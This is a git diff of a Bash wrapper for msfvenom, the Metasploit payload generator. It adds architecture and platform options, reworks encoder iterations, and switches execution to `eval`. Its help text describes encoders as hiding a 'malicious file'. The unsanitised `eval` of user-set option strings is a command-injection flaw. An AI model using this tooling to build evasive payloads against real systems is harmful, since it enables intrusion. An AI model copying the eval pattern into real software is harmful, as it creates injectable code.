@@ -12,12 +12,13 @@ BOLD='\033[1m'
 
 PAYLOAD=""
 ENCODER=""
-ITERATIONS=0
+ITERATIONS=5
 FORMAT=""
 LPORT=1234
 LHOST=""
 OUTPUT_FILE=""
-
+ARCH=""
+PLATFORM=""
 # Templates
 source "modules/.config/msfvenom.conf"
 
@@ -55,6 +56,18 @@ executeMsfVenomCmd() {
         echo -e "${RED}[!] You need to have a Local Port configured.${RESET}"
         return 2
     fi 
+
+    if [ "$ARCH" != "" ]; then
+        flags+=" -a ${ARCH}"
+    else
+        echo -e "${YELLOW}${BOLD}[-]${RESET} No architecture specified. MsfVenom will automatically detect the script's architecture"
+    fi
+
+    if [ "$PLATFORM" != "" ]; then
+        flags+=" --platform ${PLATFORM}"
+    else
+        echo -e "${YELLOW}${BOLD}[-]${RESET} No platform specified, msfvenom will automatically detect the script's platform"
+    fi
     if [ "$PAYLOAD" != "" ]; then
         flags+=" -p ${PAYLOAD}"
     else
@@ -63,16 +76,17 @@ executeMsfVenomCmd() {
     fi
     if [ "$ENCODER" != "" ]; then
         flags+=" -e ${ENCODER}"
+        if [ "$ITERATIONS" != "" ]; then
+            flags+=" -i ${ITERATIONS}"
+        else
+            echo -e "${YELLOW}${BOLD}[-] There's no specific encoding iterations. Will default to 5."
+            ITERATIONS=5
+            flags+=" -i ${ITERATIONS}"
+        fi
     else
         echo -e "${YELLOW}${BOLD}[-] There's no encoder configured, raw binary will be output."
     fi
-    if [ "$ITERATIONS" != "" ]; then
-        flags+=" -i ${ITERATIONS}"
-    else
-        echo -e "${YELLOW}${BOLD}[-] There's no specific encoding iterations. Will default to 5."
-        ITERATIONS=5
-        flags+=" -i ${ITERATIONS}"
-    fi
+    
     if [ "$OUTPUT_FILE" != "" ]; then
         flags+=" -o ${OUTPUT_FILE}"
     else
@@ -87,7 +101,7 @@ executeMsfVenomCmd() {
     fi
 
     # Execute msfvenom
-    msfvenom $flags
+    eval "msfvenom ${flags}"
 }
 
 loadTemplate() {
@@ -101,7 +115,10 @@ loadTemplate() {
     ENCODER="${template['encoder']}"
     ITERATIONS="${template['iterations']}"
     FORMAT="${template['format']}"
+    ARCH="${template['arch']}"
+    PLATFORM="${template['platform']}"
     echo -e "${BLUE}[*]${RESET} Template ${template['name']} successfully loaded"
+    echo -e "${GREEN}${BOLD}[·]${RESET} Remember to set the LHOST and output variables"
 }
 
 parseShell() {
@@ -126,18 +143,21 @@ parseShell() {
                 ENCODER="${option:8}"
                 echo -e "${BLUE}[*]${RESET} Set encoder => ${ENCODER}"
             elif [[ "${option}" = "iterations"* ]]; then
-                if [ "${ENCODER}" != "" ]; then
-                    ITERATIONS="${option:11}"
-                    echo -e "${BLUE}[*]${RESET} Set iterations => ${ITERATIONS}"
-                else
-                    echo -e "${RED}[!] Please, set the encoder first."
+                if [ "${ENCODER}" = "" ]; then
+                    echo -e "${YELLOW}${BOLD}[-]${RESET} Encoder not specified, remember to specify it."
                 fi
+
+                ITERATIONS="${option:11}"
+                echo -e "${BLUE}[*]${RESET} Set iterations => ${ITERATIONS}"
             elif [[ "${option}" = "format"* ]]; then
                 FORMAT="${option:6}"
                 echo -e "${BLUE}[*]${RESET} Set format => ${FORMAT}"
             elif [[ "${option}" = "output"* ]]; then
                 OUTPUT_FILE="${option:7}"
                 echo -e "${BLUE}[*]${RESET} Set output path => ${OUTPUT_FILE}"
+            elif [[ "${option}" = "arch"* ]]; then
+                ARCH="${option:5}"
+                echo -e "${BLUE}[*]${RESET} Set arch => ${ARCH}"
             else
                 echo -e "${RED}[!] No option selected."
             fi
@@ -170,9 +190,11 @@ parseShell() {
             echo -e "LPORT: ${LPORT} - The selected local port (I recommend a random one) ${RED}${BOLD}(mandatory).${PURPLE}"
             echo -e "LHOST: ${LHOST} - Your IP address ${RED}${BOLD}(mandatory).${PURPLE}"
             echo -e "format: ${FORMAT} - The format of the file (exe, elf) ${RED}${BOLD}(mandatory).${PURPLE}"
-            echo -e "encoder: ${ENCODER} - The selected program that hides your malicious file by encryption"
-            echo -e "iterations: ${ITERATIONS} - The times that the encoders encrypts the file."
-            echo -e "output: ${OUTPUT_FILE} - The file that you want to generate ${RED}${BOLD}(mandatory).${RESET}"
+            echo -e "encoder: ${ENCODER} - The selected program that hides your malicious file by encryption ${GREEN}${BOLD}(Optional)${PURPLE}"
+            echo -e "iterations: ${ITERATIONS} - The times that the encoders encrypts the file.${GREEN}${BOLD}(Optional but recommended if there's and encoder selected)${PURPLE}"
+            echo -e "output: ${OUTPUT_FILE} - The file that you want to generate ${RED}${BOLD}(mandatory).${PURPLE}"
+            echo -e "arch: ${ARCH} - The file's arquitecture. ${YELLOW}${BOLD}(Recommended)${PURPLE}"
+            echo -e "platform: ${PLATFORM} - The target's OS. ${YELLOW}${BOLD}(Recommended)${RESET}"
         ;;
 
         "use"*)
@@ -185,6 +207,8 @@ parseShell() {
         ;;
     esac
 }
+
+clear
 
 delayedtext "Initializing Msfvenom Helper"
 
